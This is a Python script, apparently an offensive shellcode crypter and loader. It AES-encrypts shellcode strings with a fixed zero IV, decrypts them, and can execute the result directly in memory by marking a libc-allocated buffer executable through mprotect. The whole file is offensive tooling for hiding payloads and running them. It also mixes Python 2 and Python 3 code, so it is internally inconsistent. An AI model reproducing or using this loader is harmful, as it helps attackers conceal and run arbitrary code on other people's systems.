import os,sys
import base64
from Crypto.Cipher import AES
import Crypto
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import argparse

def get_args():
  parser = argparse.ArgumentParser()
  parser.add_argument('-k', '--aes_key', required=True, action='store', help='AES Key')
  parser.add_argument('-e', '--encrypt', required=False, action='store', help='Encrypt')
  parser.add_argument('-d', '--decrypt', required=False, action='store', help='Decrypt')
  parser.add_argument('-x', '--execute', required=False, action='store_true', help='Execute the decrypted shellcode')
  my_args = parser.parse_args()
  return my_args


BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()
unpad = lambda s: s[:-ord(s[len(s)-1:])]

def iv():
	return chr(0) * 16


class AESCipher(object):

	def __init__(self, key):
		self.key = key

	def encrypt(self, message):
		message = message.encode()
		raw = pad(message)
		cipher = AES.new(self.key, AES.MODE_CBC, iv())
		enc = cipher.encrypt(raw)
		return base64.b64encode(enc).decode('utf-8')

	def decrypt(self, enc):
		enc = base64.b64decode(enc)
		cipher = AES.new(self.key, AES.MODE_CBC, iv())
		dec = cipher.decrypt(enc)
		return unpad(dec).decode('utf-8')


def encrypt_(message, aes_key):
	enc_message = AESCipher(aes_key).encrypt(message)
	return enc_message


def decrypt_(message, aes_key):
	dec_message = AESCipher(aes_key).decrypt(message)
	return dec_message


# http://hacktracking.blogspot.com/2015/05/execute-shellcode-in-python.html
def run_shellcode(shellcode):
	libc = CDLL('libc.so.6')
	shellcode = shellcode.replace('\\x', '').decode('hex')
	sc = c_char_p(shellcode)
	size = len(shellcode)
	addr = c_void_p(libc.valloc(size))
	memmove(addr, sc, size)
	libc.mprotect(addr, size, 0x7)
	run = cast(addr, CFUNCTYPE(c_void_p))
	print "\nExecuting shellcode...\n"
	run()


def show_info(text, shellcode=False):
	if shellcode:
		text_size = len([letter for letter in text if letter == 'x'])
		print "\nShellcode Length: %s" % (text_size)	
		print "Shellcode: %s" % (text)	
		print "\n------------------------------"
	else:
		print "\nEncrypted Shellcode: %s" % (text)	
		print "\n------------------------------"




def main():
	args = get_args()
	encrypt_arg = args.encrypt
	decrypt_arg = args.decrypt
	aes_key = args.aes_key
		
	if encrypt_arg is not None:
		show_info(encrypt_arg, True)
		enc_message = encrypt_(encrypt_arg, aes_key)
		show_info(enc_message)

	elif decrypt_arg is not None:
		show_info(decrypt_arg)
		decrypted = decrypt_(decrypt_arg, aes_key)
		show_info(decrypted, True)
		if args.execute:
			run_shellcode(decrypted)

	

if __name__== "__main__":
  main()
